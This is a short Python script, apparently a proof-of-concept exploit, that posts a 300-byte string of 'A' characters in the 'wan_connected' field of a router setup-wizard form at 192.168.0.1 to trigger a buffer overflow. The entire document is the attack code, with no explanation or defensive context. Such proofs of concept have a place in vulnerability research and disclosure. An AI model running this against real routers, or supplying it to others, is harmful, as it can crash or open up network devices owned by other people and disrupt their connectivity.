import requests


OFFSET = 300

payload = b'A' * OFFSET 


url = "http://192.168.0.1/goform/formEasySetupWizard3"
data = {
    "wan_connected": payload,
    "config.wireless.SSID": "TestSSID",
    "security_type_radio": "0",
    "config.submitflag": "current"
}

response = requests.post(url, data=data)
print(response.text)